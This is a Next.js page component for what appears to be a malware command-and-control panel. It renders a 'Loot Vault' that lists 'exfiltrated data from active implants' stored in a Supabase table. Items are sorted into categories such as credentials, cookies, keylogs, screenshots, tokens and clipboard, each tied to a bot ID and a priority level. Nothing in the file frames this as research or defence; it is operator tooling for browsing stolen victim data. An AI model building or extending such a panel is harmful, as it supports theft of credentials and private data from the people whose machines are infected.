import { createClient } from "@/lib/supabase/server";

export const dynamic = "force-dynamic";

const categoryIcons: Record<string, string> = {
    credentials: "🔐", cookies: "🍪", keylog: "⌨️", screenshot: "📸",
    token: "🔑", network: "🌐", clipboard: "📋", form: "📝",
    profile: "👤", websocket: "🔌", other: "📦",
};

const categories = [
    "all", "credentials", "cookies", "keylog", "screenshot",
    "token", "network", "clipboard", "form", "profile", "websocket",
];

async function getLoot(category?: string) {
    const supabase = await createClient();
    let query = supabase
        .from("loot")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(50);

    if (category && category !== "all") {
        query = query.eq("category", category);
    }

    const { data } = await query;
    return data || [];
}

export default async function LootPage({
    searchParams,
}: {
    searchParams: Promise<{ category?: string }>;
}) {
    const { category } = await searchParams;
    const activeCategory = category || "all";
    const loot = await getLoot(activeCategory);

    return (
        <div>
            {/* Header */}
            <div className="mb-8">
                <h1 className="text-2xl font-bold text-white">Loot Vault</h1>
                <p className="text-zinc-500 text-sm mt-1">All exfiltrated data from active implants</p>
            </div>

            {/* Category Filter */}
            <div className="flex flex-wrap gap-2 mb-6">
                {categories.map((cat) => (
                    <a
                        key={cat}
                        href={`/loot${cat === "all" ? "" : `?category=${cat}`}`}
                        className={`px-3.5 py-1.5 rounded-xl text-xs font-medium capitalize transition-all ${activeCategory === cat
                            ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"
                            : "bg-zinc-800/50 text-zinc-400 border border-zinc-800/50 hover:border-zinc-700/50 hover:text-white"
                            }`}
                    >
                        {cat !== "all" && <span className="mr-1.5">{categoryIcons[cat]}</span>}
                        {cat}
                    </a>
                ))}
            </div>

            {/* Loot Table */}
            <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                {loot.length === 0 ? (
                    <div className="px-6 py-16 text-center">
                        <div className="text-4xl mb-3">📦</div>
                        <p className="text-zinc-400 font-medium">No loot in this category</p>
                        <p className="text-zinc-600 text-sm mt-1">Data will appear here as bots exfiltrate it.</p>
                    </div>
                ) : (
                    <div className="divide-y divide-zinc-800/30">
                        {loot.map((item) => (
                            <details key={item.id} className="group">
                                <summary className="px-6 py-4 flex items-center justify-between cursor-pointer hover:bg-zinc-800/20 transition-colors list-none">
                                    <div className="flex items-center gap-3">
                                        <span className="text-lg">{categoryIcons[item.category] || "📦"}</span>
                                        <div>
                                            <p className="text-sm text-white font-medium">{item.title}</p>
                                            <p className="text-xs text-zinc-500">Bot: {item.bot_id.slice(0, 16)}...</p>
                                        </div>
                                    </div>
                                    <div className="flex items-center gap-3">
                                        <span className={`text-xs px-2 py-0.5 rounded-md capitalize ${item.priority === 0 ? "bg-red-500/15 text-red-400" :
                                            item.priority === 1 ? "bg-amber-500/15 text-amber-400" :
                                                "bg-zinc-800 text-zinc-400"
                                            }`}>
                                            {item.priority === 0 ? "Critical" : item.priority === 1 ? "Medium" : "Low"}
                                        </span>
                                        <span className="text-xs bg-zinc-800 px-2 py-0.5 rounded text-zinc-400 capitalize">
                                            {item.category}
                                        </span>
                                        <span className="text-[11px] text-zinc-600">{new Date(item.created_at).toLocaleString()}</span>
                                        <svg className="w-4 h-4 text-zinc-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                                        </svg>
                                    </div>
                                </summary>
                                <div className="px-6 pb-4">
                                    {item.category === "screenshot" && item.content?.startsWith("data:image") ? (
                                        <div className="bg-zinc-950 border border-zinc-800/50 rounded-xl p-4 overflow-hidden">
                                            <img
                                                src={item.content}
                                                alt={item.title}
                                                className="w-full rounded-lg border border-zinc-800/30"
                                            />
                                        </div>
                                    ) : (
                                        <pre className="bg-zinc-950 border border-zinc-800/50 rounded-xl p-4 text-xs text-zinc-300 font-mono overflow-x-auto max-h-96 whitespace-pre-wrap">
                                            {item.content || "No content"}
                                        </pre>
                                    )}
                                </div>
                            </details>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}
